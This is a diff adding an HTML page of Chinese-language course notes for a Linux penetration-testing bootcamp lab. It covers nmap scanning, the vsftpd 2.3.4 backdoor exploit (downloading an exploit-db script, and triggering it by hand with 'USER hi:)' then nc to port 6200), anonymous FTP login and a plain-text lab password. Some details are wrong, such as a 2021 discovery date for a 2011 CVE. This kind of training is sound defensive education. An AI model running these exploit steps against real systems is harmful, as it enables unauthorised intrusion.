@@ -1,0 +1,2221 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux 滲透測試訓練營 - 課程筆記</title>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --primary: #2c3e50;
+            --secondary: #e74c3c;
+            --accent: #3498db;
+            --success: #27ae60;
+            --warning: #f39c12;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: var(--dark);
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .toc {
+            background: var(--light);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+        
+        .toc h2 {
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+        
+        .toc ul {
+            list-style: none;
+        }
+        
+        .toc li {
+            padding: 5px 0;
+        }
+        
+        .toc a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .toc a:hover {
+            color: var(--secondary);
+        }
+        
+        section {
+            margin-bottom: 40px;
+        }
+        
+        h2 {
+            color: var(--accent);
+            border-bottom: 3px solid var(--secondary);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        
+        h3 {
+            color: var(--primary);
+            margin: 20px 0 10px 0;
+            font-size: 1.5em;
+        }
+        
+        h4 {
+            color: var(--secondary);
+            margin: 15px 0 8px 0;
+        }
+        
+        .concept-box {
+            background: #f8f9fa;
+            border-left: 4px solid var(--accent);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid var(--warning);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            border-left: 4px solid var(--success);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .command-box {
+            background: #2c3e50;
+            color: #2ecc71;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-size: 0.95em;
+        }
+        
+        .command-box code {
+            display: block;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+        }
+        
+        th {
+            background: var(--accent);
+            color: white;
+            padding: 12px;
+            text-align: left;
+        }
+        
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        tr:hover {
+            background: var(--light);
+        }
+        
+        .mermaid {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        
+        .tool-card {
+            background: white;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        
+        .tool-card h4 {
+            margin-top: 0;
+        }
+        
+        .tool-name {
+            font-weight: bold;
+            color: var(--secondary);
+            font-size: 1.1em;
+        }
+        
+        .step {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .step strong {
+            color: var(--accent);
+        }
+        
+        .note {
+            background: #e3f2fd;
+            border-left: 4px solid var(--accent);
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-size: 0.95em;
+        }
+        
+        .highlight {
+            background: #fffacd;
+            padding: 2px 4px;
+            border-radius: 2px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .tab-button {
+            padding: 10px 20px;
+            background: var(--light);
+            border: 2px solid var(--accent);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        
+        .tab-button:hover,
+        .tab-button.active {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            background: var(--light);
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .footer {
+            background: var(--primary);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+        }
+        
+        .ip-config {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            position: sticky;
+            top: 20px;
+            z-index: 100;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        
+        .ip-config h3 {
+            color: white;
+            margin-top: 0;
+            border-bottom: 2px solid rgba(255,255,255,0.3);
+            padding-bottom: 10px;
+        }
+        
+        .ip-inputs {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            margin: 15px 0;
+        }
+        
+        .ip-input-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .ip-input-group label {
+            font-size: 0.9em;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .ip-input-group input {
+            padding: 8px;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+        
+        .ip-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .ip-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .ip-button-save {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .ip-button-save:hover {
+            background: #229954;
+        }
+        
+        .ip-button-reset {
+            background: rgba(255,255,255,0.3);
+            color: white;
+        }
+        
+        .ip-button-reset:hover {
+            background: rgba(255,255,255,0.5);
+        }
+        
+        .ip-status {
+            font-size: 0.9em;
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .ip-status.show {
+            display: block;
+        }
+        
+        .ip-status.success {
+            background: rgba(39, 174, 96, 0.3);
+            color: #d5f4e6;
+        }
+        
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 1.8em;
+            }
+            
+            .content {
+                padding: 15px;
+            }
+            
+            h2 {
+                font-size: 1.5em;
+            }
+            
+            h3 {
+                font-size: 1.2em;
+            }
+            
+            h4 {
+                font-size: 1rem;
+            }
+            
+            .ip-inputs {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+            
+            .ip-buttons {
+                flex-wrap: wrap;
+            }
+            
+            /* 網路拓撲圖行動裝置優化 */
+            .mermaid {
+                font-size: 0.8em;
+            }
+            
+            /* 三層架構卡片 */
+            [style*="display: grid"][style*="grid-template-columns"] {
+                grid-template-columns: 1fr !important;
+                gap: 0.5rem !important;
+            }
+            
+            /* 內部網路拓撲 */
+            [style*="display: flex"][style*="flex-direction: column"] {
+                gap: 0.8rem !important;
+            }
+            
+            /* 命令框響應式 */
+            .command-box {
+                font-size: 0.8em;
+                overflow-x: auto;
+            }
+            
+            /* 表格響應式 */
+            .table-container table {
+                font-size: 0.85em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 Linux 滲透測試訓練營</h1>
+            <p>第三期課程筆記 - 完整實作指南</p>
+        </div>
+        
+        <div class="content">
+            <!-- IP 動態配置 -->
+            <div class="ip-config">
+                <h3>⚙️ 環境配置 - 自訂您的 IP 位址</h3>
+                <p style="margin: 0 0 15px 0; font-size: 0.95em;">請根據您實際的靶機和攻擊機 IP 進行配置，所有筆記中的 IP 地址將自動替換</p>
+                <div class="ip-inputs">
+                    <div class="ip-input-group">
+                        <label for="attackerIP">🎯 攻擊機 (Kali) IP</label>
+                        <input type="text" id="attackerIP" placeholder="例：172.30.0.27" value="172.30.0.27">
+                    </div>
+                    <div class="ip-input-group">
+                        <label for="targetIP">🎪 靶機 IP</label>
+                        <input type="text" id="targetIP" placeholder="例：172.30.0.34" value="172.30.0.34">
+                    </div>
+                    <div class="ip-input-group">
+                        <label for="jumpboxIP">🔌 跳板機 IP:Port</label>
+                        <input type="text" id="jumpboxIP" placeholder="例：dockerlab.feifei.tw:32835" value="dockerlab.feifei.tw:32835">
+                    </div>
+                </div>
+                <div class="ip-buttons">
+                    <button class="ip-button ip-button-save" onclick="saveIPConfig()">✅ 保存設定</button>
+                    <button class="ip-button ip-button-reset" onclick="resetIPConfig()">🔄 恢復預設</button>
+                </div>
+                <div class="ip-status" id="ip-status"></div>
+            </div>
+            
+            <div class="toc">
+                <h2>📋 課程目錄</h2>
+                <ul>
+                    <li><a href="#intro">課程介紹</a></li>
+                    <li><a href="#network">網路架構與環境設定</a></li>
+                    <li><a href="#scanning">掃描目標 (Nmap)</a></li>
+                    <li><a href="#exploitation">漏洞利用 (VSFTPD CVE-2011-2523)</a></li>
+                    <li><a href="#ftp">FTP 匿名登入</a></li>
+                    <li><a href="#cracking">密碼破解 (John the Ripper)</a></li>
+                    <li><a href="#privilege">權限提升 (Privilege Escalation)</a></li>
+                    <li><a href="#tools">核心工具介紹</a></li>
+                    <li><a href="#tips">實戰技巧與筆記</a></li>
+                    <li><a href="#review-faq">✅ 複習清單與常見問題</a></li>
+                    <li><a href="#resources">📚 線上資源參考</a></li>
+                </ul>
+            </div>
+            
+            <!-- 課程介紹 -->
+            <section id="intro">
+                <h2>📚 課程介紹</h2>
+                
+                <h3>課程目標</h3>
+                <div class="concept-box">
+                    <p>本課程專為資安初學者設計，從 <span class="highlight">漏洞掃描</span> → <span class="highlight">利用</span> → <span class="highlight">權限提升</span> → <span class="highlight">後續分析</span> 等核心環節，帶您掌握滲透測試的實戰流程。</p>
+                </div>
+                
+                <h3>課程重點</h3>
+                <div class="step">
+                    <strong>✓</strong> Kali Linux 實戰操作<br>
+                    <strong>✓</strong> nmap 掃描與服務識別<br>
+                    <strong>✓</strong> Web Shell 與 Reverse Shell<br>
+                    <strong>✓</strong> 漏洞利用與密碼破解<br>
+                    <strong>✓</strong> Linux 提權技巧<br>
+                    <strong>✓</strong> 後滲透階段的資訊蒐集
+                </div>
+                
+                <h3>適合學員</h3>
+                <ul>
+                    <li>✅ 已完成《網站安全訓練營》，希望進一步深化技能</li>
+                    <li>✅ 有基礎 Linux 和 TCP/IP 知識</li>
+                    <li>✅ 想建立滲透測試基礎能力</li>
+                    <li>✅ 喜歡靠自己摸索，享受從錯誤中學習</li>
+                </ul>
+            </section>
+            
+            <!-- 網路架構 -->
+            <section id="network">
+                <h2>🌐 網路架構與環境設定</h2>
+                
+                <h3>三層隔離架構概念</h3>
+                <div style="background-color: #f0f9ff; border-left: 4px solid #0ea5e9; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
+                    <p style="margin: 0; color: #0c4a6e;"><strong>💡 核心設計：</strong>課程環境採用三層隔離架構，模擬真實企業網路的內外網分離設計。</p>
+                </div>
+
+                <h4 style="color: #1f2937; margin-top: 1.5rem; margin-bottom: 0.75rem;">🏗️ 三層架構說明</h4>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 0.75rem; margin-bottom: 1.5rem;">
+                    <div style="background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%); border: 2px solid #0ea5e9; border-radius: 0.5rem; padding: 0.75rem;">
+                        <div style="font-weight: 600; color: #0c4a6e; margin-bottom: 0.5rem; font-size: 0.9rem;">🌍 外部層</div>
+                        <div style="font-size: 0.8rem; color: #0c4a6e; line-height: 1.5;">你的本機電腦<br/>(Windows / macOS)</div>
+                    </div>
+                    <div style="background: linear-gradient(135deg, #fef3c7 0%, #fcd34d 100%); border: 2px solid #fbbf24; border-radius: 0.5rem; padding: 0.75rem;">
+                        <div style="font-weight: 600; color: #78350f; margin-bottom: 0.5rem; font-size: 0.9rem;">🔌 中介層</div>
+                        <div style="font-size: 0.8rem; color: #78350f; line-height: 1.5;">跳板機 (Jumpbox)<br/>公網入口點</div>
+                    </div>
+                    <div style="background: linear-gradient(135deg, #fecaca 0%, #fca5a5 100%); border: 2px solid #ef4444; border-radius: 0.5rem; padding: 0.75rem;">
+                        <div style="font-weight: 600; color: #7f1d1d; margin-bottom: 0.5rem; font-size: 0.9rem;">🔒 內部層</div>
+                        <div style="font-size: 0.8rem; color: #7f1d1d; line-height: 1.5;">攻擊機 + 靶機<br/>同一內部網段</div>
+                    </div>
+                </div>
+
+                <h3>網路架構概覽 - Mermaid 圖表</h3>
+                <div class="mermaid">
+                    graph TB
+                        A["🖥️ 外部網路<br/>(Your Machine)"]
+                        B["🔌 跳板機 Jumpbox<br/>dockerlab.feifei.tw:32835"]
+                        C["⚔️ 攻擊機 Kali<br/>172.30.0.27<br/>Port: 22"]
+                        D["🎯 靶機 Target<br/>172.30.0.34<br/>Port: 21, 22"]
+                        
+                        A -->|SSH 連線| B
+                        B -->|Port Mapping| C
+                        C -->|同一網段<br/>內部網路| D
+                        
+                        style A fill:#e74c3c
+                        style B fill:#f39c12
+                        style C fill:#27ae60
+                        style D fill:#e74c3c
+                </div>
+
+                <h3 style="margin-top: 2rem;">詳細網路拓撲圖</h3>
+                <div style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 0.75rem; padding: 1rem; overflow-x: auto;">
+                    <div style="width: 100%; max-width: 100%;">
+                        <!-- 整體容器 -->
+                        <div>
+                            <!-- 外部網路區域 -->
+                            <div style="text-align: center; margin-bottom: 2rem;">
+                                <div style="display: inline-block; background-color: #eff6ff; border: 2px solid #60a5fa; border-radius: 0.5rem; padding: 1rem; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 90%; min-width: 150px;">
+                                    <div style="font-size: 1.5rem; margin-bottom: 0.5rem;">🖥️</div>
+                                    <div style="font-weight: 600; font-size: 0.9rem; margin-bottom: 0.5rem; color: #0c4a6e;">你的本機</div>
+                                    <div style="font-size: 0.75rem; color: #0c4a6e; font-family: 'Courier New', monospace;">Windows / macOS</div>
+                                    <div style="font-size: 0.7rem; color: #0ea5e9; margin-top: 0.5rem; font-weight: 600;">外部網路</div>
+                                </div>
+                            </div>
+
+                            <!-- 連線箭頭 -->
+                            <div style="text-align: center; margin-bottom: 1.5rem;">
+                                <div style="font-size: 0.8rem; color: #666; margin-bottom: 0.3rem; font-weight: 600;">↓ SSH 連線 ↓</div>
+                            </div>
+
+                            <!-- 跳板機 -->
+                            <div style="text-align: center; margin-bottom: 1.5rem;">
+                                <div style="display: inline-block; background-color: #fef3c7; border: 2px solid #fbbf24; border-radius: 0.5rem; padding: 1rem; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 90%; min-width: 160px;">
+                                    <div style="font-size: 1.5rem; margin-bottom: 0.5rem;">🔌</div>
+                                    <div style="font-weight: 600; font-size: 0.9rem; margin-bottom: 0.5rem; color: #78350f;">跳板機 (Jumpbox)</div>
+                                    <div style="font-size: 0.75rem; color: #78350f; font-family: 'Courier New', monospace; margin-bottom: 0.2rem; word-break: break-word;">dockerlab.feifei.tw</div>
+                                    <div style="font-size: 0.75rem; color: #78350f; font-family: 'Courier New', monospace;">Port: 32835 (例)</div>
+                                    <div style="font-size: 0.7rem; color: #fbbf24; margin-top: 0.5rem; font-weight: 600;">公網入口點</div>
+                                </div>
+                            </div>
+
+                            <!-- Port Mapping 說明 -->
+                            <div style="background-color: #f0fdf4; border-left: 4px solid #10b981; padding: 0.75rem; margin-bottom: 1.5rem; border-radius: 0.25rem; text-align: center;">
+                                <div style="font-size: 0.8rem; color: #065f46; font-weight: 600;">📌 Port Mapping</div>
+                                <div style="font-size: 0.75rem; color: #047857; margin-top: 0.25rem; word-break: break-word;">Port 32835 ⟶ 內部 22</div>
+                            </div>
+
+                            <!-- 內部網路分隔框 -->
+                            <div style="border: 2px dashed #f97316; border-radius: 0.75rem; padding: 1rem; background-color: #fff7ed; position: relative; margin-bottom: 1rem;">
+                                <div style="position: absolute; top: -0.7rem; left: 0.75rem; background-color: #fff7ed; padding: 0 0.3rem; font-size: 0.7rem; font-weight: 600; color: #ea580c;">內部網路 (172.30.0.0/24)</div>
+
+                                <div style="display: flex; flex-direction: column; gap: 1rem; padding-top: 0.5rem;">
+                                    <!-- 攻擊機 -->
+                                    <div style="text-align: center;">
+                                        <div style="display: inline-block; background-color: #dcfce7; border: 2px solid #22c55e; border-radius: 0.5rem; padding: 0.75rem; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 90%; min-width: 140px;">
+                                            <div style="font-size: 1.3rem; margin-bottom: 0.3rem;">⚔️</div>
+                                            <div style="font-weight: 600; font-size: 0.85rem; margin-bottom: 0.3rem; color: #15803d;">攻擊機 (Kali)</div>
+                                            <div style="font-size: 0.75rem; color: #15803d; font-family: 'Courier New', monospace; margin-bottom: 0.2rem;">172.30.0.27</div>
+                                            <div style="font-size: 0.7rem; color: #22c55e;">Port 22</div>
+                                        </div>
+                                    </div>
+
+                                    <!-- 連線箭頭 -->
+                                    <div style="text-align: center;">
+                                        <div style="font-size: 0.7rem; color: #dc2626; font-weight: 600;">↕ 直接連線 ↕</div>
+                                    </div>
+
+                                    <!-- 靶機 -->
+                                    <div style="text-align: center;">
+                                        <div style="display: inline-block; background-color: #fee2e2; border: 2px solid #ef4444; border-radius: 0.5rem; padding: 0.75rem; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 90%; min-width: 140px;">
+                                            <div style="font-size: 1.3rem; margin-bottom: 0.3rem;">🎯</div>
+                                            <div style="font-weight: 600; font-size: 0.85rem; margin-bottom: 0.3rem; color: #991b1b;">靶機 (Target)</div>
+                                            <div style="font-size: 0.75rem; color: #991b1b; font-family: 'Courier New', monospace; margin-bottom: 0.2rem;">172.30.0.34</div>
+                                            <div style="font-size: 0.7rem; color: #dc2626;">FTP / SSH</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- 連線步驟說明 -->
+                            <div style="background-color: #eff6ff; border-left: 4px solid #3b82f6; padding: 0.75rem; border-radius: 0.25rem; margin-top: 1rem;">
+                                <div style="font-weight: 600; color: #1e40af; margin-bottom: 0.5rem; font-size: 0.85rem;">📋 連線流程：</div>
+                                <ol style="margin: 0; padding-left: 1.2rem; font-size: 0.8rem; color: #1e40af; line-height: 1.6;">
+                                    <li style="margin-bottom: 0.3rem;">外部 SSH 連線到跳板機</li>
+                                    <li style="margin-bottom: 0.3rem;">跳板機轉發到攻擊機</li>
+                                    <li>攻擊機滲透靶機</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h3 style="margin-top: 2rem;">🔒 為什麼採用跳板機設計？</h3>
+                <div class="hint-box" style="background-color: #f0fdf4; border-left: 4px solid #10b981; margin-bottom: 1rem;">
+                    <h4 style="color: #065f46; margin-top: 0;">安全隔離</h4>
+                    <p style="color: #047857; margin: 0;">真實企業環境中，外部無法直接訪問內部伺服器。跳板機（VPN / Jumpbox）是唯一的入口點，確保內部網路安全性和可追蹤性。</p>
+                </div>
+
+                <div class="hint-box" style="background-color: #fef3c7; border-left: 4px solid #f59e0b; margin-bottom: 1rem;">
+                    <h4 style="color: #78350f; margin-top: 0;">模擬真實環境</h4>
+                    <p style="color: #92400e; margin: 0;">通過這種設計，你將學習如何在受限的網路環境中進行滲透測試，這正是現實世界中的典型情況。許多企業都採用類似的內外網分離架構。</p>
+                </div>
+
+                <div class="hint-box" style="background-color: #eff6ff; border-left: 4px solid #3b82f6; margin-bottom: 1rem;">
+                    <h4 style="color: #0c4a6e; margin-top: 0;">⚙️ Port Mapping 機制</h4>
+                    <p style="color: #0c4a6e; margin: 0;">外部不同的 Port (32835、32836 等) 映射到內部同一個 Port (22)，允許多個學員同時使用不同的外部 Port 訪問各自的機器，避免 Port 衝突。</p>
+                </div>
+                
+                <h3>環境資訊</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>元素</th>
+                            <th>IP 位址</th>
+                            <th>埠口</th>
+                            <th>說明</th>
+                        </tr>
+                        <tr>
+                            <td>跳板機</td>
+                            <td>dockerlab.feifei.tw</td>
+                            <td>32835</td>
+                            <td>SSH 入口點</td>
+                        </tr>
+                        <tr>
+                            <td>攻擊機</td>
+                            <td>172.30.0.27</td>
+                            <td>22 (SSH)</td>
+                            <td>Kali Linux</td>
+                        </tr>
+                        <tr>
+                            <td>靶機</td>
+                            <td>172.30.0.34</td>
+                            <td>21 (FTP)</td>
+                            <td>vsFTPd 2.3.4</td>
+                        </tr>
+                        <tr>
+                            <td>靶機</td>
+                            <td>172.30.0.34</td>
+                            <td>22 (SSH)</td>
+                            <td>OpenSSH 7.6p1</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h3>連線步驟</h3>
+                <div class="step">
+                    <strong>步驟 1：SSH 連線到跳板機</strong><br>
+                    <div class="command-box"><code>ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0674696972466269656d63746a67642860636f60636f287271">[email&#160;protected]</a> -p 32835</code></div>
+                    <strong>密碼：</strong> <code>1234@zxcv</code>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 2：跳板機轉發到攻擊機</strong><br>
+                    跳板機會自動將連線轉發到內部網路的 Kali Linux
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 3：在攻擊機上對靶機進行滲透</strong><br>
+                    <div class="command-box"><code>nmap 172.30.0.34</code></div>
+                </div>
+            </section>
+            
+            <!-- 掃描目標 -->
+            <section id="scanning">
+                <h2>🔍 掃描目標 (Nmap)</h2>
+                
+                <div class="concept-box">
+                    <strong>Nmap 是什麼？</strong><br>
+                    Network Mapper（Nmap）是一個開源的網路掃描工具，用於發現網路上的主機、開放的埠口和運行的服務。
+                </div>
+                
+                <h3>掃描流程圖</h3>
+                <div class="mermaid">
+                    graph LR
+                        A["基本掃描<br/>nmap IP"]
+                        B["全埠掃描<br/>nmap -p- IP"]
+                        C["服務版本<br/>nmap -sV IP"]
+                        D["NSE 腳本<br/>nmap -sC IP"]
+                        E["分析結果"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        D --> E
+                        
+                        style A fill:#3498db
+                        style B fill:#3498db
+                        style C fill:#2ecc71
+                        style D fill:#2ecc71
+                        style E fill:#f39c12
+                </div>
+                
+                <h3>掃描命令詳解</h3>
+                
+                <h4>1️⃣ 基本掃描</h4>
+                <div class="command-box"><code>nmap 172.30.0.34</code></div>
+                <div class="concept-box">
+                    <strong>功能：</strong> 掃描前 1000 個常用埠口<br>
+                    <strong>結果：</strong> 發現 FTP (21) 和 SSH (22) 開放
+                </div>
+                
+                <h4>2️⃣ 全埠掃描</h4>
+                <div class="command-box"><code>nmap -p- 172.30.0.34</code></div>
+                <div class="concept-box">
+                    <strong>參數說明：</strong> <code>-p-</code> 表示掃描所有 65535 個埠口<br>
+                    <strong>耗時：</strong> 較長（約 1 秒）
+                </div>
+                
+                <h4>3️⃣ 版本檢測</h4>
+                <div class="command-box"><code>nmap -p 21,22 -sV 172.30.0.34</code></div>
+                <div class="concept-box">
+                    <strong>參數說明：</strong><br>
+                    • <code>-p 21,22</code> = 指定掃描的埠口<br>
+                    • <code>-sV</code> = Service Version（檢測服務版本）<br>
+                    <strong>發現：</strong><br>
+                    • FTP: vsftpd 2.3.4 (有漏洞！)<br>
+                    • SSH: OpenSSH 7.6p1
+                </div>
+                
+                <h4>4️⃣ NSE 腳本掃描</h4>
+                <div class="command-box"><code>nmap -p 21,22 -sV -sC 172.30.0.34</code></div>
+                <div class="concept-box">
+                    <strong>參數說明：</strong><br>
+                    • <code>-sC</code> = 啟用 NSE 腳本引擎（Nmap Scripting Engine）<br>
+                    <strong>腳本功能：</strong><br>
+                    • <code>ftp-anon</code> = 檢測 FTP 匿名登入<br>
+                    • 自動列出 FTP 目錄結構<br>
+                    • 發現系統敏感信息
+                </div>
+                
+                <h3>Nmap 重要參數表</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>參數</th>
+                            <th>全寫</th>
+                            <th>功能</th>
+                        </tr>
+                        <tr>
+                            <td>-p-</td>
+                            <td>--ports 1-65535</td>
+                            <td>掃描所有埠口</td>
+                        </tr>
+                        <tr>
+                            <td>-p 21,22</td>
+                            <td>--ports 21,22</td>
+                            <td>指定特定埠口</td>
+                        </tr>
+                        <tr>
+                            <td>-sV</td>
+                            <td>--version-intensity</td>
+                            <td>檢測服務版本</td>
+                        </tr>
+                        <tr>
+                            <td>-sC</td>
+                            <td>--script=default</td>
+                            <td>執行默認 NSE 腳本</td>
+                        </tr>
+                        <tr>
+                            <td>-A</td>
+                            <td>--all</td>
+                            <td>全面掃描 (版本+腳本+追蹤)</td>
+                        </tr>
+                    </table>
+                </div>
+            </section>
+            
+            <!-- 漏洞利用 -->
+            <section id="exploitation">
+                <h2>💥 漏洞利用 (VSFTPD CVE-2011-2523)</h2>
+                
+                <h3>漏洞詳解</h3>
+                <div class="warning-box">
+                    <strong>⚠️ 漏洞名稱：</strong> vsftpd 2.3.4 Backdoor Command Execution<br>
+                    <strong>漏洞編號：</strong> CVE-2011-2523<br>
+                    <strong>發現日期：</strong> 2021-04-09<br>
+                    <strong>嚴重程度：</strong> 9.8 CRITICAL
+                </div>
+                
+                <h3>漏洞原理流程圖</h3>
+                <div class="mermaid">
+                    sequenceDiagram
+                        participant 攻擊機 as A["⚔️ 攻擊機"]
+                        participant FTP as F["FTP Port 21"]
+                        participant 後門 as B["後門 Port 6200"]
+                        
+                        A->>F: USER hi:)<br/>(含特殊符號)
+                        F->>F: 檢測到漏洞<br/>開啟後門
+                        B->>B: Shell 產生<br/>(uid=1000)
+                        A->>B: nc localhost 6200
+                        B->>A: 獲得命令執行權限<br/>id, ls等
+                </div>
+                
+                <h3>利用步驟</h3>
+                
+                <h4>方法 1：使用自動化腳本</h4>
+                <div class="step">
+                    <strong>步驟 1：下載漏洞利用腳本</strong>
+                    <div class="command-box"><code>curl -O https://www.exploit-db.com/raw/49757</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 2：重命名為 Python 檔案</strong>
+                    <div class="command-box"><code>mv 49757 49757.py</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 3：執行漏洞利用</strong>
+                    <div class="command-box"><code>python3 49757.py 172.30.0.34</code></div>
+                </div>
+                
+                <h4>方法 2：手動利用 (推薦學習)</h4>
+                <div class="step">
+                    <strong>步驟 1：連線到 FTP Port 21</strong>
+                    <div class="command-box"><code>nc 172.30.0.34 21</code></div>
+                    <div class="note">nc = netcat，用於建立 TCP/UDP 連線</div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 2：發送特殊命令（觸發後門）</strong>
+                    <div class="command-box"><code>USER hi:)
+PASS pass</code></div>
+                    <div class="concept-box">
+                        <strong>關鍵點：</strong> <code>USER</code> 後的命令包含特殊符號 <code>:)</code><br>
+                        這會觸發 vsftpd 2.3.4 中的後門機制
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 3：開啟新連線到後門埠口</strong>
+                    <div class="command-box"><code>nc 172.30.0.34 6200</code></div>
+                    <div class="success-box">
+                        ✅ 成功！此時可執行任意命令
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 4：驗證權限</strong>
+                    <div class="command-box"><code>id</code></div>
+                    <div class="note">輸出：uid=1000(ftpuser) gid=1000(ftpuser)</div>
+                </div>
+                
+                <h3>漏洞利用原理圖</h3>
+                <div class="mermaid">
+                    graph TD
+                        A["vsftpd 2.3.4"]
+                        B["USER 命令解析<br/>包含:)符號"]
+                        C["檢測到後門<br/>觸發條件"]
+                        D["Port 6200<br/>開啟 Shell"]
+                        E["遠程代碼執行<br/>RCE"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        D --> E
+                        
+                        style C fill:#e74c3c,color:#fff
+                        style E fill:#27ae60,color:#fff
+                </div>
+            </section>
+            
+            <!-- FTP 匿名登入 -->
+            <section id="ftp">
+                <h2>📁 FTP 匿名登入與信息蒐集</h2>
+                
+                <h3>FTP 基本概念</h3>
+                <div class="concept-box">
+                    <strong>FTP (File Transfer Protocol)：</strong> 檔案傳輸協議<br>
+                    <strong>端口：</strong> 21 (控制連線)<br>
+                    <strong>風險：</strong> 明文傳輸，容易被竊聽
+                </div>
+                
+                <h3>FTP 連線步驟</h3>
+                
+                <div class="step">
+                    <strong>步驟 1：啟動 FTP 客戶端</strong>
+                    <div class="command-box"><code>ftp</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 2：連線到目標</strong>
+                    <div class="command-box"><code>ftp> open 172.30.0.34</code></div>
+                </div>
+                
+                <div class="step">
+                    <strong>步驟 3：匿名登入</strong>
+                    <div class="command-box"><code>Name (172.30.0.34:root): anonymous
+Password: (直接按 Enter，留空)</code></div>
+                    <div class="success-box">
